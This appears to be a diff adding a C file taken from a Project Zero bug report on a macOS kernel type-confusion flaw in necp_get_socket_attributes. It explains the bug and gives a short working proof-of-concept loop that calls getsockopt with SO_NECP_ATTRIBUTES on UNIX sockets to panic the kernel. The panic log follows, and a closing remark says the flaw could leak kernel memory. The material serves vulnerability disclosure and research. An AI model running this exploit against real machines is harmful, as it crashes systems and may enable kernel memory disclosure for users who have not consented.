@@ -1,0 +1,69 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1392&desc=2
+
+When getsockopt() [edited; original report said "setsockopt"] is called on any socket with level SOL_SOCKET and optname SO_NECP_ATTRIBUTES, necp_get_socket_attributes is invoked.
+necp_get_socket_attributes() unconditionally calls sotoinpcb(so):
+
+    errno_t
+    necp_get_socket_attributes(struct socket *so, struct sockopt *sopt)
+    {
+            int error = 0;
+            u_int8_t *buffer = NULL;
+            u_int8_t *cursor = NULL;
+            size_t valsize = 0;
+            struct inpcb *inp = sotoinpcb(so);
+
+            if (inp->inp_necp_attributes.inp_domain != NULL) {
+                    valsize += sizeof(struct necp_tlv_header) + strlen(inp->inp_necp_attributes.inp_domain);
+            }
+    [...]
+    }
+
+sotoinpcb() causes type confusion if so->so_pcb is of an unexpected type (because the socket is not an IPv4/IPv6 socket):
+
+    #define sotoinpcb(so) ((struct inpcb *)(so)->so_pcb)
+
+If necp_get_socket_attributes() is called on a UNIX domain socket, this will cause the members of inp->inp_necp_attributes to be read from type-confused, probably also out-of-bounds memory behind the actual so->so_pcb (which is of type `struct unpcb`, which looks much smaller than `struct inpcb`).
+
+
+To trigger this bug, compile the following code, run it, and cause some system activity, e.g. by launching the browser (the PoC won't crash if so->so_pcb contains NULLs in the right spots).
+
+==============
+*/
+
+#include <sys/types.h>
+#include <sys/un.h>
+#include <sys/socket.h>
+#include <err.h>
+#include <unistd.h>
+
+#define SO_NECP_ATTRIBUTES 0x1109
+
+int main(void) {
+  while (1) {
+    int s = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (s == -1)
+      err(1, "socket");
+    getsockopt(s, SOL_SOCKET, SO_NECP_ATTRIBUTES, NULL, NULL);
+    close(s);
+  }
+}
+/*
+==============
+
+On macOS 10.13 (17A405), this causes the following crash:
+
+==============
+*** Panic Report ***
+panic(cpu 2 caller 0xffffff800e78a611): Kernel trap at 0xffffff800e976930, type 14=page fault, registers:
+CR0: 0x000000008001003b, CR2: 0x000000fa000000cc, CR3: 0x0000000200037073, CR4: 0x00000000001627e0
+RAX: 0x000000fa000000cc, RBX: 0x000000fa000000cb, RCX: 0xffffff800eb90aad, RDX: 0xffffff800eb90dcc
+RSP: 0xffffff8018de3e70, RBP: 0xffffff8018de3e90, RSI: 0xffffff8018de3ef0, RDI: 0xffffff8032ac66a8
+R8:  0x0000000000000001, R9:  0xffffffff00000000, R10: 0x0000000000000000, R11: 0x0000000000000246
+R12: 0xffffff80357cf7d0, R13: 0xffffff8032d69a08, R14: 0xffffff8018de3ef0, R15: 0xffffff8032ac66a8
+RFL: 0x0000000000010206, RIP: 0xffffff800e976930, CS:  0x0000000000000008, SS:  0x0000000000000010
+Fault CR2: 0x000000fa000000cc, Error code: 0x0000000000000000, Fault CPU: 0x2, PL: 0, VF: 1
+==============
+
+This bug should be usable for disclosing kernel memory.
+*/
